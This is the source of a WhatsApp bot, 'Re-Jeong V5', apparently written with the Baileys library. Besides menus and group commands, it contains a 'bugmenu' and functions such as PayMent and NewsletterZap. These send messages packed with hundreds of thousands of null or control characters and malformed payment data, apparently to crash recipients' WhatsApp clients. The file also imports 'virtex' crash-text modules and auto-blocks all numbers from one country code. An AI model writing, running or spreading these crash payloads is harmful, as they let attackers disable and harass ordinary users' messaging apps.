
module.exports = async (rjng, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await rjng.decodeJid(rjng.user.id)
const sender = m.key.fromMe ? (rjng.user.id.split(':')[0]+'@s.whatsapp.net' || rjng.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await rjng.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./rejeongv5.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = 'Holla holla😂 peace aside. Lets go for it'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return rjng.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ Re-Jeong V5 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    rjng.autoshalat = rjng.autoshalat ? rjng.autoshalat : {}
    let id = m.chat
    if (id in rjng.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        rjng.autoshalat[id] = [
            rjng.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Time to pray ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   rjng.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: rjng.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By Re-Jeong`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await rjng.sendPresenceUpdate('composing', jid)
      return rjng.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await rjng.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await rjng.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			rjng.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "Re-Jeong V5" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `By Re-Jeong Guanxii`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await rjng.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰Re-Jeong 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍︎🩸⃟༑⌁⃰Re-Jeong 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await rjng.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rjng.getName(i + '@s.whatsapp.net')}\n
FN:${await rjng.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await rjng.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `rejeong`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!rjng.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"R",
"Re",
"Re-J",
"Re-Jeong",
"Re-Jeong V5",
"☠️", 
"💀",
"Re-Jeong V5☠️💀", 
]
let { key } = await rjng.sendMessage(from, {text: '𝐑'})

for (let i = 0; i < baralod.length; i++) {
await rjng.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
rjng.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            rjng.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Re-Jeong V5`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/Xynz.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
rjng.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
rjng.groupParticipantsUpdate(m.chat, [sender], 'delete')
rjng.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
await loading()
darkphonk = fs.readFileSync('./database/conga.mp3')
const version = require("baileys/package.json").version
let run = runtime(process.uptime())
const startTime = new Date()
const menu = `        Welcome to the world of darkness where we don't believe in  peace ✌️💀     
This is Re-Jeong V5 serving you...
Your name  : ${m.pushName}
My owner  : Guanxii Re-Jeong 
His number: +27623649420
Prefix: Multi
Runtime: ${runtime(process.uptime())}
ping: ${new Date() - startTime}ms
Library: @whiskeysocketbaileys
Platform: non of your business 

Guanxii Re-Jeong ©Copyright`
let sections = [{
title: 'Re-Jeong V5',
highlight_label: 'Allmenu',
rows: [{
title: 'allmenu', 
id: '.allmenu'
}]
},
{
highlight_label: 'bugmenu',
rows: [{
title: 'bugmenu', 
id: '.bugmenu'
}]
},
{
highlight_label: 'groupmenu',
rows: [{
title: 'groupmenu︎', 
id: '.groupmenu'
}]
},
{
highlight_label: 'owner commands',
rows: [{
title: 'rjngmenu︎', 
id: '.rjngmenu'
}]
}]
let listMessage = {
    title: 'Re-Jeong V5', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rjng.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Guanxii Re-Jeong \",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rjng.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await rjng.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break


case 'bugmenu': {
await loading()
darkphonk = fs.readFileSync('./database/conga.mp3')
const version = require("baileys/package.json").version
const bugmenu = `Hello ${m.pushName} Bug commands here(please use wisely) Peace never existed

 rejeong-bug
 fuck
 rape
 kiss
 romance
 😘`
let listMessage = {
    title: 'Re-Jeong V5', 
};
 let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rjng.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Guanxii Re-Jeong \",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rjng.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await rjng.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
 }
 break 


case 'allmenu': {
await loading()
darkphonk = fs.readFileSync('./database/conga.mp3')
const version = require("baileys/package.json").version
const allmenu = `Hi ${m.pushName} All my commands here

addprem
delprem
public
self
enc
hidetag
tagall
kick
promote
demote
kill (only when bot is admin in the gc)`
let listMessage = {
    title: 'Re-Jeong V5', 
};
let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: allmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rjng.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Guanxii Re-Jeong \",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rjng.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await rjng.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break 


case 'groupmenu': {
await loading()
darkphonk = fs.readFileSync('./database/conga.mp3')
const version = require("baileys/package.json").version
const groupmenu = `Hello  ${m.pushName} here are the group commands

hidetag
tagall
kick
promote
demote
kill (only when bot is admin in the gc)`
let listMessage = {
    title: 'Re-Jeong V5', 
};
let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: groupmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rjng.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Guanxii Re-Jeong \",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rjng.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await rjng.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break


case 'rjngmenu': {
await loading()
darkphonk = fs.readFileSync('./database/conga.mp3')
const version = require("baileys/package.json").version
const ownermenu = `Hello ${m.pushName} find here the owner commands

addprem
delprem
self 
public
kill`
let listMessage = {
    title: 'Re-Jeong V5', 
};
let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: ownermenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rjng.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Guanxii Re-Jeong \",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rjng.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await rjng.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break


case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`where is the message?`)
rjng.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`What should i tell the mfs?`)
